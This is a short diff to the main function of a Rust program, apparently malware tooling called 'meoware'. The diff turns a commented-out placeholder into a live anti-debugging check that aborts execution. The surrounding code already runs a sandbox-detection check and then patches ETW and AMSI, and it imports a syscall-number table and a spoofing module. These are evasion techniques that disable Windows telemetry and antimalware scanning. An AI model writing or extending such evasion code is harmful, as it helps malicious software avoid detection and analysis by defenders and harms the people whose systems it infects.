@@ -1,6 +1,6 @@
 #![cfg_attr(not(any(debug_assertions, feature = "verbose")), no_std)]
 
-use meoware::core::{ssn_table, sandbox, etw, amsi, spoof};
+use meoware::core::{amsi, anti_debug, etw, sandbox, spoof, ssn_table};
 use meoware::debug;
 
 fn main() {
@@ -13,13 +13,11 @@ fn main() {
             debug!("[SANDBOX] Environment check failed — aborting");
             return
         } 
-        
-        /*
-            TODO: Debugging check
-            if !anti_debugging::is_safe_environment() {
-                return
-            } 
-        */
+
+        if !anti_debug::is_safe_environment() {
+            debug!("[ANIT] Environment check failed - aborting");
+            return;
+        }
 
         etw::patch_etw();
         amsi::patch_amsi();  
